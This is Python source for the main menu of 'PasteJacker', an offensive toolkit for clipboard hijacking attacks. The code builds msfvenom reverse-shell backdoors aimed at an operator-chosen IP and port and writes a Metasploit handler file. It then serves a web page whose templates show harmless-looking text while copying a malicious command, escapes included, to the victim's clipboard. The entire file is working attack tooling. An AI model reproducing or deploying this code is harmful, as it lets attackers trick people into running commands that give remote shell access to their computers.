#-*- coding: utf-8 -*-
# Written by: Karim shoair - D4Vinci
# PasteJacker toolkit
import os,sys,time,readline
from .Core.color import *
from .Core import utils,checkers,serve
from .Core.dictionaries import *

def menu():
    if os.name=="nt":
        print("Sorry, but this tool requires a lot of things that's not on windows!")
        sys.exit(0)

    elif os.geteuid()!=0:
        print("Sorry, but this tool needs to be executed as root!")
        sys.exit(0)

    utils.print_banner()
    current_range = utils.print_choices(["Windows","Linux"])
    os_type = colored_input()
    valid_input = utils.validate_input(os_type, (1,current_range))
    if valid_input==-1:
        sys.exit(0)
    elif not valid_input:
        menu()
    else:
        checkers.our_folder()
        save_os_type( int(os_type) )
        choose_liner_menu()

def choose_liner_menu():
    methods = get_liners()
    while True:
        current_range = utils.print_choices(methods, spaces=6)
        delivery_method = colored_input("What to do with target",spaces=7)
        valid_input = utils.validate_input(delivery_method, (1,current_range))
        if valid_input==-1:
            menu()
            break
        elif valid_input:
            temp = set_liner(delivery_method)
            if temp in (0,1):
                template_menu()
            elif temp==2:
                metasploit_payloads_menu()
            break

def template_menu():
    templates = get_templates()
    templates_to_print = []
    for template in templates:
        line  = template
        #line += end+B+"\t\t\tAdvantages    : "+end+G+templates[template]["advantages"]+"\n"
        #line += B+"\t\t\tDisadvantages : "+end+G+templates[template]["disadvantages"]+"\n"
        templates_to_print.append(line)
    while True:
        current_range = utils.print_choices(templates_to_print, spaces=14)
        template = colored_input("Choose template",spaces=15)
        valid_input = utils.validate_input(template, (1,current_range))
        if valid_input==-1:
            choose_liner_menu()
            break
        elif valid_input:
            set_template(template)
            serve_menu()
            break


def metasploit_payloads_menu():
    while True:
        payloads = get_payloads()
        current_range = utils.print_choices(payloads, spaces=10)
        payload = colored_input("Metasploit payload to use in generating",spaces=11)
        valid_input = utils.validate_input(payload, (1,current_range))
        if valid_input==-1:
            choose_liner_menu()
            break
        else:
            ip,port = utils.ask_for_ip_port(spaces=15) # This will be for the msfvenom backdoor so I will ask him for another port for serving
            payload = payloads[int(payload)-1]
            settings.ip = ip
            generation(payload, ip, port)
            break

def generation(payload,ip,port):
    if not checkers.msfvenom():
        error("Can't generate a payload as msfvenom is not installed! (Or can't detect it)")
        time.sleep(1)
        menu()
    else:
        f = "elf" if "linux" in payload else "exe"
        c = utils.execute("msfvenom -p "+payload+" LHOST=" + ip + " LPORT=" + str(port) + " -f "+f+" >/root/.pastejacker/main."+f)
        if not c:
            error("Failed to generate msfvenom backdoor!")
            sys.exit(1)
        else:
            status("MSFVenom backdoor saved as "+M+" /root/.pastejacker/main."+f+end)
            utils.write_resource(payload,ip,port)
            status("Metasploit resource file saved as "+M+" /root/.pastejacker/msf_handler.rc"+end)
            template_menu()

def serve_menu():
    while True:
        port = colored_input("Port to serve on (80)",spaces=18) or 80
        try:
            port = int(port)
        except:
            error("Please enter a valid port!")
            time.sleep(1)
            continue
        else:
            if checkers.port_in_use(port):
                error("Port "+B+str(port)+R+" is already in use, kill the running service or choose another port!")
                continue
            if not settings.final_liner:
                prepare_liner(settings.ip,port)
            msg = utils.ask_for_text()
            b,c = msg.split(" ")[0], " ".join(msg.split(" ")[1:])
            final_serve(port, b, c, get_escapes())
            break

def final_serve(port,b,c,escape):
    status("Now let's start serving...")
    esc1,esc2=escape
    if settings.template=="js_method.html": # To escape the quotes
        settings.final_liner = settings.final_liner.replace("'","\\'")
    data = serve.render(settings.template, payload=settings.final_liner, fake_p1=b, fake_p2=" "+c+"\r\n", escape_p1=esc1, escape_p2=esc2)
    serve.make_index(data)
    serve.start_web_server("/root/.pastejacker/",port)
    status("Serving on port "+R+str(port))
    print(G+"-"*30+end)
    while True:
        try:
            time.sleep(1)
            continue
        except KeyboardInterrupt:
            serve.stop_web_server()
            print("")
            status("Webserver stopped!")
            break
